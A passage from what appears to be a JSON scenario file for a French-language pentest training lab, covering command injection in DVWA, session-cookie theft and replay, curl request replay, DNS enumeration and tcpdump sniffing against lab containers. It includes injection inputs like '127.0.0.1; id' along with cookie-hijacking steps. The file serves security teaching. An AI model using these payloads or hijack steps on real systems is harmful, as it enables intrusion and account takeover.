          "content": "Dans DVWA, va dans « Command Injection », niveau Low. Tu as un champ qui exécute probablement ping.",
          "command": null,
          "tip": "En Low, la chaîne est concaténée telle quelle à la commande.",
          "learn": "Commande typique côté serveur : exec('ping -c 4 ' . $_GET['ip']); il suffit d’ajouter ; ou | pour une autre commande."
        },
        {
          "title": "Tester l’injection",
          "content": "Entre 127.0.0.1; id ou 127.0.0.1 | whoami. Si tu vois la sortie de id/whoami, l’injection fonctionne.",
          "command": null,
          "tip": "Selon l’OS : ; ou & ou | ou &&. Sur Windows : & ou |.",
          "learn": "Ne jamais passer d’entrée utilisateur non sanitized à system(), exec(), passthru(), etc."
        }
      ]
    },
    {
      "id": "scenario-18-cookie-session",
      "title": "Scénario 18 : Vol et abus de cookie de session",
      "description": "Les cookies de session identifient l’utilisateur. Si un attaquant les récupère (XSS, sniffing, vol), il peut se faire passer pour la victime. Tu explores le mécanisme sur DVWA.",
      "difficulty": "Easy",
      "category": "web",
      "time": "15 min",
      "machines": [
        {
          "name": "DVWA",
          "urlKey": "dvwa",
          "note": "admin / password"
        },
        {
          "name": "DevTools navigateur",
          "url": "#",
          "note": "Application > Cookies"
        }
      ],
      "tasks": [
        {
          "title": "Identifier le cookie de session",
          "content": "Connecte-toi à DVWA. Ouvre les DevTools (F12), onglet Application (ou Storage), section Cookies. Repère le cookie (ex: PHPSESSID).",
          "command": null,
          "tip": "Ce cookie est envoyé à chaque requête ; sans lui tu serais déconnecté.",
          "learn": "HttpOnly limite l’accès au cookie par JavaScript (réduit le vol via XSS)."
        },
        {
          "title": "Simuler un vol",
          "content": "Copie la valeur du cookie. Ouvre une fenêtre de navigation privée (ou un autre navigateur), va sur DVWA, injecte le cookie (extension ou DevTools). Tu es connecté comme la victime.",
          "command": null,
          "tip": "En conditions réelles, l’attaquant récupère le cookie via XSS (document.cookie) ou MITM.",
          "learn": "HTTPS + HttpOnly + SameSite renforcent la sécurité des sessions."
        }
      ]
    },
    {
      "id": "scenario-19-burp-curl",
      "title": "Scénario 19 : Rejouer des requêtes avec cURL",
      "description": "En pentest web, on modifie et rejoue des requêtes (comme avec Burp). Sans Burp, on peut utiliser cURL pour rejouer une requête copiée depuis les DevTools.",
      "difficulty": "Easy",
      "category": "web",
      "time": "15 min",
      "machines": [
        {
          "name": "DVWA ou vuln-api",
          "urlKey": "dvwa",
          "note": "Cible"
        },
        {
          "name": "Terminal attaquant",
          "urlKey": "terminal",
          "note": "curl"
        }
      ],
      "tasks": [
        {
          "title": "Copier une requête en cURL",
          "content": "Dans le navigateur, ouvre DevTools > Network. Effectue une action (ex: login DVWA). Clic droit sur la requête > Copy > Copy as cURL.",
          "command": null,
          "tip": "Colle dans un terminal (hôte ou attaquant) pour rejouer. Adapte l’URL si tu es dans le conteneur (dvwa au lieu de localhost).",
          "learn": "Rejouer des requêtes permet de tester des payloads sans refaire tout le parcours."
        },
        {
          "title": "Modifier et rejouer",
          "content": "Modifie le corps ou les paramètres dans la ligne cURL (ex: change le mot de passe, l’id utilisateur). Exécute. Tu simules ce que fait un proxy comme Burp.",
          "command": "curl -X POST http://dvwa/login -d 'username=admin&password=test' -H 'Content-Type: application/x-www-form-urlencoded'",
          "tip": "Pour les cookies, ajoute -b 'PHPSESSID=xxx'.",
          "learn": "L’automatisation (scripts, Burp Intruder) repose sur la relecture de requêtes modifiées."
        }
      ]
    },
    {
      "id": "scenario-20-dns-enum",
      "title": "Scénario 20 : Énumération DNS et sous-domaines",
      "description": "Avant d’attaquer un domaine, on énumère les sous-domaines et les enregistrements DNS pour élargir la surface d’attaque. Tu utilises dig et des outils du lab.",
      "difficulty": "Easy",
      "category": "network",
      "time": "20 min",
      "machines": [
        {
          "name": "Terminal attaquant",
          "urlKey": "terminal",
          "note": "dig, nslookup, theHarvester"
        }
      ],
      "tasks": [
        {
          "title": "Requêtes DNS de base",
          "content": "dig example.com A et dig example.com MX. Note les IP et les serveurs mail. dig example.com ANY pour tout type.",
          "command": "dig example.com A\n dig example.com MX",
          "tip": "En lab Docker les noms sont résolus par le réseau interne ; pour un vrai domaine utilise un nom public.",
          "learn": "DNS révèle des serveurs, des sous-domaines et parfois des infos de configuration."
        },
        {
          "title": "Sous-domaines avec theHarvester",
          "content": "theHarvester -d example.com -b dnsdumpster (ou bing). Les sous-domaines trouvés peuvent être des cibles (dev., admin., api.).",
          "command": "theHarvester -d example.com -b bing",
          "tip": "Combine avec des wordlists (subdomains.txt) pour du brute force de sous-domaines.",
          "learn": "Un sous-domaine oublié peut être moins sécurisé que le domaine principal."
        }
      ]
    },
    {
      "id": "scenario-21-sniffing-trafic",
      "title": "Scénario 21 : Sniffing et analyse du trafic",
      "description": "Capturer et analyser le trafic entre l’attaquant et les cibles (vuln-api, vuln-network) avec tcpdump et tshark. Comprendre les paquets TCP/HTTP.",
      "difficulty": "Easy",
      "category": "network",
      "time": "25 min",
      "machines": [
        {
          "name": "Terminal attaquant",
          "urlKey": "terminal",
          "note": "tcpdump, tshark"
        },
        {
          "name": "vuln-api",
          "url": "#",
          "note": "Cible pour générer du trafic"
        }
      ],
      "tasks": [
        {
          "title": "Lancer une capture tcpdump",
          "content": "Depuis l’attaquant, lance tcpdump -i any -w /workspace/cap.pcap host vuln-api. Garde la commande en cours.",
          "command": "tcpdump -i any -w /workspace/cap.pcap host vuln-api",
          "tip": "Lance dans un terminal (ou en arrière-plan avec &).",
          "learn": "tcpdump permet de capturer tout le trafic sur une interface (ou any)."
        },
        {
          "title": "Générer du trafic",
          "content": "Dans un autre terminal (ou make shell dans un 2e terminal), fais plusieurs requêtes : curl http://vuln-api:5000/api/health et curl http://vuln-api:5000/api/users/1.",
          "command": "curl http://vuln-api:5000/api/health\ncurl http://vuln-api:5000/api/users/1",
          "tip": "Depuis le conteneur attaquant, vuln-api est joignable par son nom.",
          "learn": "Le trafic HTTP apparaîtra en clair dans la capture (pas de TLS entre conteneurs)."
        },
        {
          "title": "Arrêter et lire la capture",
          "content": "Arrête tcpdump (Ctrl+C). Puis lis le fichier : tcpdump -r /workspace/cap.pcap -n. Ou avec tshark : tshark -r /workspace/cap.pcap -V.",
          "command": "tcpdump -r /workspace/cap.pcap -n",
          "tip": "tshark -r cap.pcap affiche les couches (HTTP, TCP, IP).",
          "learn": "L’analyse de paquets est la base du forensique réseau et du débogage."
        }
      ]
    },
    {
      "id": "scenario-22-creer-ses-labs",
      "title": "Scénario 22 : Créer ses propres labs et engagements",
      "description": "Utiliser la machine attaquant comme base pour tes propres objectifs : noter tes cibles dans la vue Engagements, enregistrer des sessions, et documenter ce que tu fais (rapport, commandes, captures).",
      "difficulty": "Easy",
      "category": "red",
      "time": "15 min",
      "machines": [
        {
          "name": "Terminal attaquant",
          "urlKey": "terminal",
          "note": "Tes outils"
        },
        {
          "name": "Vue Engagements",
          "url": "#",
          "note": "Plateforme > Cibles & Proxy"
        }
      ],
      "tasks": [
        {
          "title": "Ouvrir la vue Engagements",
          "content": "Dans la plateforme, va dans « Cibles & Proxy » (Engagements). Tu peux y ajouter des cibles personnalisées (nom, URL, notes).",
          "command": null,
          "tip": "Utilise cette vue pour noter les IP/URL des cibles du lab (vuln-network, vuln-api) ou de tes propres targets.",
          "learn": "Documenter ses cibles et objectifs aide à structurer un pentest ou un lab perso."
        },
        {
          "title": "Ajouter une cible lab",
          "content": "Ajoute une cible : nom « vuln-network », URL ou note « ssh root@vuln-network, redis-cli -h vuln-network ». Tu peux aussi créer des sessions (sauvegarder l’état de tes cibles/todos).",
          "command": null,
          "tip": "Les sessions permettent de reprendre plus tard avec la même liste de cibles et de notes.",
          "learn": "En vrai engagement, on garde des sessions par client ou par périmètre."
        },
        {
          "title": "Exporter ou garder des preuves",
          "content": "Depuis l’attaquant, tes captures (tcpdump -w) et fichiers sont dans /workspace. Tu peux les copier vers ta machine avec docker cp. Le journal d’activité de la plateforme enregistre tes navigations et copies de commandes.",
          "command": "docker cp lab-attaquant:/workspace/cap.pcap ./",
          "tip": "Sur ta machine hôte, depuis le dossier du projet. Pour un rapport, documente commandes + captures + screenshots.",
          "learn": "Traçabilité et preuves sont essentielles en pentest et en forensique."
        }
      ]
    }
  ]
}